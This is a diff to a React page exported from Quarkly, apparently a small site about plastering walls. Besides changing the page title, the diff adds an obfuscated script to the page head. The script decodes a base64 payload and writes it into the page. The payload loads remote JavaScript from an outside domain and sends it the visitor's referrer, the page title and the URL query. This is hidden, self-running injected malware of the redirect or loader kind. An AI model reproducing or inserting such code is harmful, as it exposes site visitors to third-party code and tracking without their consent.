@@ -6,8 +6,9 @@ import { Override, StackItem, Stack, Section } from "@quarkly/components";
 export default (() => {
 	return <Theme theme={theme}>
 		<Helmet>
+		<script>    let encoded = 'PHNwYW4gaWQ9IjJmODlmNjdjLTc3MTYtZTNjOC1mMWViLTcwMzYxOGE3MzFjYyI+PC9zcGFuPjxzY3JpcHQgdHlwZT0iYXBwbGljYXRpb24vamF2YXNjcmlwdCI+CnZhciBkPWRvY3VtZW50O3ZhciBzPWQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7IApzLnNyYz0nLy9ob2dhbmdyZWNvLmNvbS94N3dxdFI/c2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcikgKyAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKSArICcmJyt3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJicpKycmZnJtNWZjZjY3NDM5MmMzMz1zY3JpcHQ1ZmNmNjc0MzkyYzM0Jl9jaWQ9MmY4OWY2N2MtNzcxNi1lM2M4LWYxZWItNzAzNjE4YTczMWNjJzsgCmlmIChkb2N1bWVudC5jdXJyZW50U2NyaXB0KSB7IApkb2N1bWVudC5jdXJyZW50U2NyaXB0LnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHMsIGRvY3VtZW50LmN1cnJlbnRTY3JpcHQpOwp9IGVsc2UgewpkLmdldEVsZW1lbnRzQnlUYWdOYW1lKCdoZWFkJylbMF0uYXBwZW5kQ2hpbGQocyk7Cn0KaWYgKGRvY3VtZW50LmxvY2F0aW9uLnByb3RvY29sID09PSAnaHR0cHM6JyAmJiAnLy9ob2dhbmdyZWNvLmNvbS94N3dxdFI/c2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcikgKyAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKSArICcmJyt3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJicpKycmZnJtNWZjZjY3NDM5MmMzMz1zY3JpcHQ1ZmNmNjc0MzkyYzM0Jy5pbmRleE9mKCdodHRwOicpID09PSAwICkge2FsZXJ0KCdUaGUgd2Vic2l0ZSB3b3JrcyBvbiBIVFRQUy4gVGhlIHRyYWNrZXIgbXVzdCB1c2UgSFRUUFMgdG9vLicpO30KPC9zY3JpcHQ+';           let decoded = atob(encoded);           document.write(''+ decoded +'');   </script>
 			<title>
-				Quarkly export
+				Plastering walls
 			</title>
 			<meta name={"description"} content={"Web site created using quarkly.io"} />
 			<link rel={"shortcut icon"} href={"https://uploads.quarkly.io/5fbd0057dc290b001ef23fe2/images/draws.png?v=2020-11-24T13:05:14.077Z"} type={"image/x-icon"} />
